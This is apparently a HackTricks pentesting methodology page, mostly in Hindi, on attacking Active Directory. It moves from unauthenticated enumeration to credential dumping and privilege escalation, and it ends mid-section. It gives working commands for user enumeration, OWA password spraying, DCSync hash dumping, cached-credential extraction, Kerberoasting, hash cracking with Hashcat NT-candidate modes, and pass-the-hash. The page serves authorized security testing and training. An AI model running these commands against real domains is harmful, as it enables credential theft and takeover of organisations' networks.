# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** नेटवर्क व्यवस्थापकों को नेटवर्क के भीतर **domains**, **users**, और **objects** को प्रभावी ढंग से बनाने और प्रबंधित करने में सक्षम करने वाली एक बुनियादी तकनीक है। यह बड़े पैमाने पर काम करने के लिए डिजाइन की गई है, जिससे बहु संख्या के उपयोगकर्ताओं को प्रबंधनीय **groups** और **subgroups** में व्यवस्थित किया जा सकता है, और विभिन्न स्तरों पर **access rights** को नियंत्रित किया जा सकता है।

**Active Directory** की संरचना तीन मुख्य स्तरों से मिलकर बनती है: **domains**, **trees**, और **forests**। एक **domain** उन ऑब्जेक्ट्स का संग्रह होता है — जैसे **users** या **devices** — जो एक सामान्य डेटाबेस साझा करते हैं। **Trees** उन domains का समूह होते हैं जो एक साझा संरचना से जुड़े होते हैं, और एक **forest** कई trees का संग्रह होता है, जो आपस में **trust relationships** के माध्यम से जुड़े होते हैं, और संगठनात्मक संरचना की सबसे ऊपरी परत बनाते हैं। विशिष्ट **access** और **communication rights** को इन स्तरों पर निर्दिष्ट किया जा सकता है।

Active Directory के प्रमुख सिद्धांत:

1. **Directory** – Active Directory ऑब्जेक्ट्स से सम्बन्धित सभी जानकारी को रखता है।
2. **Object** – डायरेक्टरी के भीतर इकाइयाँ, जैसे **users**, **groups**, या **shared folders**।
3. **Domain** – डायरेक्टरी ऑब्जेक्ट्स के लिए एक कंटेनर; एक **forest** के भीतर कई domains coexist कर सकते हैं, प्रत्येक का अपना ऑब्जेक्ट संग्रह होता है।
4. **Tree** – उन domains का समूह जो एक साझा root domain को साझा करते हैं।
5. **Forest** – Active Directory में संगठनात्मक संरचना की उच्चतम परत, जो कई trees और उनके बीच की **trust relationships** से बनी होती है।

**Active Directory Domain Services (AD DS)** कई सर्विसेज़ को शामिल करता है जो नेटवर्क के केंद्रीकृत प्रबंधन और संचार के लिए महत्वपूर्ण हैं। ये सर्विसेज़ शामिल हैं:

1. **Domain Services** – डेटा स्टोरेज को केंद्रीकृत करता है और **users** और **domains** के बीच इंटरैक्शन (authentication और search सुविधाएँ) को प्रबंधित करता है।
2. **Certificate Services** – सुरक्षित **digital certificates** के निर्माण, वितरण और प्रबंधन की देखभाल करता है।
3. **Lightweight Directory Services** – **LDAP protocol** के माध्यम से डायरेक्टरी-समर्थित अनुप्रयोगों को सपोर्ट करता है।
4. **Directory Federation Services** – एकल सत्र में कई वेब अनुप्रयोगों के लिए **single-sign-on** क्षमताएँ प्रदान करता है।
5. **Rights Management** – अनधिकृत वितरण और उपयोग को नियंत्रित करके कॉपीराइट सामग्री की सुरक्षा में मदद करता है।
6. **DNS Service** – **domain names** के समाधान के लिए आवश्यक है।

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

यदि आपके पास केवल AD पर्यावरण तक पहुंच है लेकिन आपके पास कोई credentials/sessions नहीं हैं, तो आप कर सकते हैं:

- **Pentest the network:**
- नेटवर्क स्कैन करें, मशीनें और खुले पोर्ट खोजें और **exploit vulnerabilities** करने या उनसे **extract credentials** करने की कोशिश करें (उदाहरण के लिए, [printers could be very interesting targets](ad-information-in-printers.md)).
- DNS की enum करके डोमेन के प्रमुख सर्वरों के बारे में जानकारी मिल सकती है जैसे web, printers, shares, vpn, media, आदि।
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- इसको करने के बारे में अधिक जानकारी के लिए General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) देखें।
- **Check for null and Guest access on smb services** (यह आधुनिक Windows संस्करणों पर काम नहीं करेगा):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB सर्वर की enumeration पर एक अधिक विस्तृत गाइड यहाँ मिल सकती है:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP की enumeration पर एक अधिक विस्तृत गाइड यहाँ मिल सकती है (विशेष रूप से anonymous access पर ध्यान दें):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- credentials इकट्ठा करें [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) के जरिए host तक पहुँचें
- credentials इकट्ठा करें **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- internal documents, social media, सेवाओं (मुख्यतः web) और सार्वजनिक रूप से उपलब्ध स्रोतों से usernames/names निकालें।
- यदि आपको कंपनी कर्मचारियों के पूर्ण नाम मिलते हैं, तो आप विभिन्न AD **username conventions** आजमा सकते हैं (**read this**)। सबसे सामान्य conventions हैं: _NameSurname_, _Name.Surname_, _NamSur_ (3letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Check the [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) and [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) pages.
- **Kerbrute enum**: जब एक **invalid username is requested** तो server **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ के साथ जवाब देगा, जिससे हम यह निर्धारित कर सकते हैं कि username अमान्य था। **Valid usernames** या तो **TGT in a AS-REP** response देंगे या error _KRB5KDC_ERR_PREAUTH_REQUIRED_, जो बताता है कि user को pre-authentication करने की आवश्यकता है।
- **No Authentication against MS-NRPC**: domain controllers पर MS-NRPC (Netlogon) इंटरफेस के खिलाफ auth-level = 1 (No authentication) का उपयोग करके। यह विधि MS-NRPC इंटरफेस को bind करने के बाद `DsrGetDcNameEx2` फ़ंक्शन को कॉल करके बिना किसी credentials के यह जांचती है कि user या computer मौजूद है या नहीं। इस प्रकार की enumeration को NauthNRPC tool ने लागू किया है। रिसर्च यहां पाई जा सकती है: [https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

अगर आपने नेटवर्क में इनमें से किसी सर्वर को पाया है, तो आप **user enumeration against it** भी कर सकते हैं। उदाहरण के लिए, आप टूल [**MailSniper**](https://github.com/dafthack/MailSniper) का उपयोग कर सकते हैं:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

ठीक है, तो आपको पहले से ही एक वैध username पता है लेकिन कोई password नहीं... तब प्रयास करें:

- [**ASREPRoast**](asreproast.md): यदि किसी user के पास attribute _DONT_REQ_PREAUTH_ **नहीं है** तो आप उस user के लिए एक **AS_REP message** request कर सकते हैं जो कुछ डेटा रखेगा जो user के password के derivation से encrypt होता है।
- [**Password Spraying**](password-spraying.md): खोजे गए प्रत्येक user के साथ सबसे **आम passwords** आजमाएं, शायद कोई user खराब password इस्तेमाल कर रहा हो (password policy का ध्यान रखें!)।
- ध्यान दें कि आप users के mail servers तक पहुँचने के लिए **OWA servers** पर भी spray कर सकते हैं।

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

आप कुछ challenge **hashes** प्राप्त कर पाने में सक्षम हो सकते हैं ताकि आप नेटवर्क के कुछ protocols को **poisoning** कर के क्रैक कर सकें:

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

यदि आप Active Directory का enumeration करने में सफल रहे हैं तो आपके पास **अधिक emails और नेटवर्क की बेहतर समझ** होगी। आप NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) को मजबूर करके AD environment तक पहुँचने में सक्षम हो सकते हैं।

### Steal NTLM Creds

यदि आप **null या guest user** के साथ अन्य PCs या shares तक **access** कर सकते हैं तो आप ऐसे **files** (जैसे SCF file) रख सकते हैं जो अगर किसी तरह access हो जाएँ तो यह **आपके खिलाफ NTLM authentication trigger** करेंगे ताकि आप **NTLM challenge** चुरा कर उसे क्रैक कर सकें:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** उन सभी NT hashes को एक candidate password के रूप में treat करता है जो आपके पास पहले से हैं, उन slower formats के लिए जिनका key material सीधे NT hash से निकला होता है। Kerberos RC4 tickets, NetNTLM challenges, या cached credentials में लंबी passphrases को brute-force करने के बजाय, आप NT hashes को Hashcat के NT-candidate modes में feed करते हैं और इसे password reuse validate करने देते हैं बिना plaintext जाने। यह विशेष रूप से प्रभावी है जब domain compromise के बाद आप हजारों current और historical NT hashes harvest कर सकते हैं।

आप shucking तब इस्तेमाल करें जब:

- आपके पास DCSync, SAM/SECURITY dumps, या credential vaults से एक NT corpus हो और आपको अन्य domains/forests में reuse टेस्ट करना हो।
- आप RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, या DCC/DCC2 blobs capture करते हैं।
- आप लंबे, uncrackable passphrases के reuse को जल्दी साबित करना चाहते हैं और तुरंत Pass-the-Hash के जरिए pivot करना चाहते हैं।

यह तकनीक उन encryption types पर काम **नहीं करती** जिनकी keys NT hash नहीं हैं (उदा., Kerberos etype 17/18 AES)। यदि कोई domain केवल AES-only लागू करता है, तो आपको सामान्य password modes पर लौटना होगा।

#### Building an NT hash corpus

- **DCSync/NTDS** – history के साथ `secretsdump.py` इस्तेमाल करें ताकि संभवतः सबसे बड़ा सेट NT hashes (और उनके previous values) प्राप्त हो सके:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries candidate pool को काफी बढ़ा देते हैं क्योंकि Microsoft प्रति account तक 24 previous hashes store कर सकता है। NTDS secrets harvest करने के और तरीकों के लिए देखें:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (या Mimikatz `lsadump::sam /patch`) local SAM/SECURITY data और cached domain logons (DCC/DCC2) extract करता है। उन hashes को deduplicate करके उसी `nt_candidates.txt` सूची में जोड़ें।
- **Track metadata** – प्रत्येक hash को produce करने वाले username/domain को रखें (भले ही wordlist केवल hex ही क्यों न रखे)। Matching hashes आपको तुरंत बता देते हैं कि Hashcat winning candidate print करते ही कौन सा principal password reuse कर रहा है।
- समान forest या trusted forest से candidates पसंद करें; इससे shucking के दौरान overlap की संभावना अधिक होती है।

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**। rule engines disable करें (कोई `-r`, कोई hybrid modes नहीं) क्योंकि mangling candidate key material को corrupt कर देता है।
- ये modes स्वाभाविक रूप से तेज़ नहीं हैं, लेकिन NTLM keyspace (~30,000 MH/s on an M3 Max) Kerberos RC4 (~300 MH/s) की तुलना में ~100× तेज़ है। curated NT list को टेस्ट करना slow format में पूरे password space को एक्सप्लोर करने से बहुत सस्ता होता है।
- हमेशा **latest Hashcat build** चलाएँ (`git clone https://github.com/hashcat/hashcat && make install`) क्योंकि modes 31500/31600/35300/35400 हाल ही में ship हुए हैं।
- वर्तमान में AS-REQ Pre-Auth के लिए कोई NT mode नहीं है, और AES etypes (19600/19700) के लिए plaintext password की आवश्यकता होती है क्योंकि उनके keys PBKDF2 के जरिए UTF-16LE passwords से derivation होते हैं, न कि raw NT hashes से।

#### Example – Kerberoast RC4 (mode 35300)

1. एक low-privileged user के साथ target SPN के लिए RC4 TGS capture करें (विस्तार के लिए Kerberoast पेज देखें):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. अपने NT list के साथ ticket को शक करें (shuck):

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat प्रत्येक NT candidate से RC4 key derive करता है और `$krb5tgs$23$...` blob validate करता है। एक match confirm करता है कि service account आपके किसी existing NT hash का उपयोग कर रहा है।

3. तुरंत PtH के ज़रिये pivot करें:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

आप आवश्यकता पड़ने पर बाद में plaintext `hashcat -m 1000 <matched_hash> wordlists/` से recover कर सकते हैं।

#### Example – Cached credentials (mode 31600)

1. compromised workstation से cached logons dump करें:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. इच्छित domain user की DCC2 line को `dcc2_highpriv.txt` में कॉपी करें और शक करें:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. सफल match आपको पहले से ज्ञात NT hash देता है, जो साबित करता है कि cached user password reuse कर रहा है। इसे सीधे PtH के लिए इस्तेमाल करें (`nxc smb <dc_ip> -u highpriv -H <hash>`) या fast NTLM mode में brute-force करके string recover करें।

यही workflow NetNTLM challenge-responses (`-m 27000/27100`) और DCC (`-m 31500`) पर भी लागू होती है। एक बार match पहचान लेने पर आप relay, SMB/WMI/WinRM PtH लॉन्च कर सकते हैं, या offline masks/rules के साथ NT hash को फिर से क्रैक कर सकते हैं।

## Enumerating Active Directory WITH credentials/session

इस चरण के लिए आपके पास एक valid domain account के credentials या session का compromise होना आवश्यक है। यदि आपके पास कुछ valid credentials हैं या domain user के रूप में shell है, तो **पहले बताए गए विकल्प** अभी भी अन्य users को compromise करने के विकल्प हैं।

authenticated enumeration शुरू करने से पहले आपको **Kerberos double hop problem** के बारे में पता होना चाहिए।

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

किसी account के compromise होना पूरे domain को compromise करना शुरू करने के लिए एक **बड़ा कदम** है, क्योंकि अब आप Active Directory Enumeration शुरू कर सकेंगे:

[**ASREPRoast**](asreproast.md) के संदर्भ में आप अब हर संभावित vulnerable user को ढूंढ सकते हैं, और [**Password Spraying**](password-spraying.md) के संदर्भ में आप सभी usernames की सूची लेकर compromised account का password, खाली passwords और नए promising passwords आजमा सकते हैं।

- आप [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) का उपयोग कर सकते हैं
- आप [**powershell for recon**](../basic-powershell-for-pentesters/index.html) का भी उपयोग कर सकते हैं जो अधिक stealthier होगा
- आप अधिक detailed information extract करने के लिए [**use powerview**](../basic-powershell-for-pentesters/powerview.md) भी उपयोग कर सकते हैं
- Active Directory में recon के लिए एक और शानदार tool है [**BloodHound**](bloodhound.md). यह **बहुत stealthy नहीं** है (इस पर निर्भर करता है कि आप कौन से collection methods उपयोग करते हैं), लेकिन **यदि आपको परवाह नहीं है** तो आपको इसे ज़रूर आज़माना चाहिए। पता लगाएँ कि users कहाँ RDP कर सकते हैं, अन्य groups तक path ढूंढें, आदि।
- **अन्य automated AD enumeration tools हैं:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) क्योंकि इनमें दिलचस्प जानकारी हो सकती है।
- एक **GUI वाला tool** जिसका आप directory enumerate करने के लिए उपयोग कर सकते हैं वह है **AdExplorer.exe** from **SysInternal** Suite।
- आप LDAP database में **ldapsearch** से खोज भी कर सकते हैं ताकि fields _userPassword_ & _unixUserPassword_ में credentials या यहां तक कि _Description_ में भी देखने के लिए। अन्य तरीकों के लिए cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment)।
- यदि आप **Linux** उपयोग कर रहे हैं, तो आप domain को enumerate करने के लिए [**pywerview**](https://github.com/the-useless-one/pywerview) का भी उपयोग कर सकते हैं।
- आप automated tools भी आज़मा सकते हैं:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Windows से सभी domain usernames प्राप्त करना बहुत आसान है (`net user /domain` ,`Get-DomainUser` या `wmic useraccount get name,sid`)। Linux में आप उपयोग कर सकते हैं: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` या `enum4linux -a -u "user" -p "password" <DC IP>`

> भले ही यह Enumeration section छोटा दिखे, यह सब में सबसे महत्वपूर्ण हिस्सा है। links (मुख्यतः cmd, powershell, powerview और BloodHound) को एक्सेस करें, सीखें कि domain को कैसे enumerate करना है और अभ्यास करें जब तक आप सहज न हों। assessment के दौरान यह वो मुख्य क्षण होगा जब आप DA तक पहुँचने का रास्ता पाएँगे या यह निर्णय लें कि कुछ नहीं किया जा सकता।

### Kerberoast

Kerberoasting में services से जुड़े user accounts द्वारा उपयोग किए जाने वाले **TGS tickets** प्राप्त करना और उनकी encryption (जो user passwords पर आधारित है) को **offline** क्रैक करना शामिल है।

इस पर और अधिक जानकारी के लिए:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

एक बार जब आपने कुछ credentials प्राप्त कर लिए हों तो आप जांच सकते हैं कि क्या आपके पास किसी भी **machine** तक access है। इसके लिए आप अपने port scans के अनुसार विभिन्न protocols पर कई servers से connect करने के लिए **CrackMapExec** का उपयोग कर सकते हैं।

### Local Privilege Escalation

यदि आपके पास compromised credentials या session के रूप में एक regular domain user का access है और इस user के साथ आपके पास domain में किसी भी machine तक **access** है तो आपको locally privileges escalate करने और credentials loot करने का प्रयास करना चाहिए। क्योंकि केवल local administrator privileges के साथ आप अन्य users के hashes memory (LSASS) में और locally (SAM) में dump कर पाएँगे।

इस book में [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) और एक [**checklist**](../checklist-windows-privilege-escalation.md) का पूरा पेज है। साथ ही, WinPEAS का उपयोग करना न भूलें: [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)।

### Current Session Tickets

यह बहुत **असंभावित** है कि आपको current user में ऐसे **tickets** मिलें जो आपको unexpected resources तक access की अनुमति दें, लेकिन आप जांच कर सकते हैं:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

यदि आप Active Directory का enumeration करने में सफल हो गए हैं तो आपके पास **अधिक ईमेल और नेटवर्क की बेहतर समझ** होगी। आप NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)** को मजबूर कर पाने में सक्षम हो सकते हैं।**

### Looks for Creds in Computer Shares | SMB Shares

अब जब आपके पास कुछ बेसिक credentials हैं तो आपको जाँचना चाहिए कि क्या आप AD के अंदर साझा की जा रही किसी भी **रोचक फ़ाइल** को **find** कर सकते हैं। आप यह मैन्युअली कर सकते हैं पर यह बहुत उबाऊ और दोहराव वाला काम है (और भी ज्यादा अगर आपको सैकड़ों डॉक्स मिलें जिन्हें चेक करना हो)।

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

यदि आप अन्य PCs या shares तक **access** कर सकते हैं तो आप ऐसी **files** रख सकते हैं (जैसे SCF file) जिन्हें यदि किसी ने एक्सेस किया तो यह आपके खिलाफ t**rigger an NTLM authentication against you** करेगा ताकि आप **steal** कर सकें वह **NTLM challenge** और उसे crack कर सकें:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

यह vulnerability किसी भी authenticated user को **domain controller** को compromise करने की अनुमति देती थी।


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**नीचे दिए गए techniques के लिए एक सामान्य domain user पर्याप्त नहीं है, आपको इन attacks को करने के लिए कुछ विशेष privileges/credentials चाहिए होंगे।**

### Hash extraction

आशा है कि आप कुछ local admin account को [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) (relaying सहित), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), स्थानीय रूप से privileges escalate करके ([escalating privileges locally](../windows-local-privilege-escalation/index.html)) compromise करने में सफल रहे होंगे।\
अब समय है कि आप सभी hashes को memory और स्थानीय स्तर पर dump करें।\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**एक बार जब आपके पास किसी user का hash हो**, आप उसका उपयोग करके उसे **impersonate** कर सकते हैं।\
आपको कुछ ऐसे **tool** का उपयोग करना होगा जो उस **hash** का उपयोग कर **NTLM authentication** perform करे, **या** आप एक नया **sessionlogon** बना कर वह **hash** **LSASS** के अंदर **inject** कर सकते हैं, ताकि जब भी कोई **NTLM authentication** हो, वह **hash** उपयोग किया जाए। आखिरी विकल्प वही है जो mimikatz करता है।\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

यह attack इसका लक्ष्य रखता है कि उपयोगकर्ता के NTLM hash का उपयोग कर Kerberos tickets मांगे जाएँ, जो NTLM protocol पर सामान्य Pass The Hash का एक विकल्प है। इसलिए, यह खासकर उन नेटवर्क्स में **useful** हो सकता है जहाँ NTLM protocol disabled है और केवल **Kerberos** authentication protocol के रूप में allowed है।


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Pass The Ticket (PTT) attack method में हमलावर किसी उपयोगकर्ता का password या hash नहीं बल्कि उसका authentication ticket **steal** करते हैं। यह चोरी किया गया ticket बाद में उपयोगकर्ता को **impersonate** करने के लिए उपयोग किया जाता है, जिससे नेटवर्क के अंदर resources और services तक unauthorized access मिल जाती है।


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

यदि आपके पास किसी local administrator का **hash** या **password** है तो आपको उसके साथ अन्य **PCs** पर **login locally** करके प्रयास करना चाहिए।
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> ध्यान दें कि यह काफी **शोरगुल** कर सकता है और **LAPS** इसे **कम** कर देगा।

### MSSQL Abuse & Trusted Links

यदि किसी उपयोगकर्ता के पास **MSSQL instances तक पहुंच** के अधिकार हैं, तो वह इसे MSSQL होस्ट पर **commands execute** करने के लिए उपयोग कर सकता है (यदि यह SA के रूप में चल रहा हो), NetNTLM **hash** चुरा सकता है या यहाँ तक कि **relay attack** कर सकता है।\
अगर कोई MSSQL instance किसी दूसरे MSSQL instance द्वारा trusted (database link) है और उपयोगकर्ता को trusted database पर अधिकार हैं, तो वह **trust relationship का उपयोग करके दूसरे instance में भी queries execute कर सकेगा**। ये trusts chained हो सकते हैं और किसी बिंदु पर उपयोगकर्ता एक misconfigured database पा सकता है जहाँ वह commands execute कर सकता है।\
**Databases के बीच के links forest trusts के पार भी काम करते हैं।**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory और deployment suites अक्सर credentials और code execution के लिए शक्तिशाली रास्ते खोलते हैं। देखें:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

यदि आप किसी Computer object में attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) पाते हैं और उस computer पर आपके पास domain privileges हैं, तो आप उस कंप्यूटर पर लॉगिन करने वाले हर user के memory से TGTs dump कर सकेंगे।\
तो, अगर कोई **Domain Admin उस कंप्यूटर पर login** करता है, तो आप उसका TGT dump करके [Pass the Ticket](pass-the-ticket.md) का उपयोग कर उसकी impersonate कर सकेंगे।\
constrained delegation की बदौलत आप यहां तक कि **एक Print Server को स्वचालित रूप से compromise** कर सकते हैं (आशा है कि वह एक DC होगा) ।


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

यदि किसी user या computer को "Constrained Delegation" की अनुमति है तो वह **किसी कंप्यूटर पर कुछ services को access करने के लिए किसी भी user का impersonate** कर सकेगा।\
यदि आप इस user/computer का **hash compromise** कर लेते हैं तो आप किसी भी user (यहाँ तक कि domain admins) को भी कुछ services तक पहुँचने के लिए **impersonate** कर सकेंगे।


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

किसी remote computer के Active Directory object पर **WRITE** privilege होना उच्च अधिकारों के साथ code execution हासिल करने का मार्ग खोल देता है:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Compromised user के पास कुछ domain objects पर कुछ **दिलचस्प privileges** हो सकते हैं जो आपको बाद में **lateral move/privilege escalate** करने की अनुमति दे सकते हैं।


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

डोमेन में किसी **Spool service listening** का पता लगाना इसे **abuse** करके **नए credentials प्राप्त** करने और **privileges escalate** करने के लिए इस्तेमाल किया जा सकता है।


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

यदि **अन्य उपयोगकर्ता** compromised मशीन **access** करते हैं, तो memory से **credentials gather** करना और उनके processes में **beacons inject** करके उनकी impersonation करना संभव है।\
आम तौर पर उपयोगकर्ता सिस्टम को RDP के माध्यम से access करेंगे, तो यहाँ बताया गया है कि third party RDP sessions पर कुछ हमले कैसे किए जा सकते हैं:


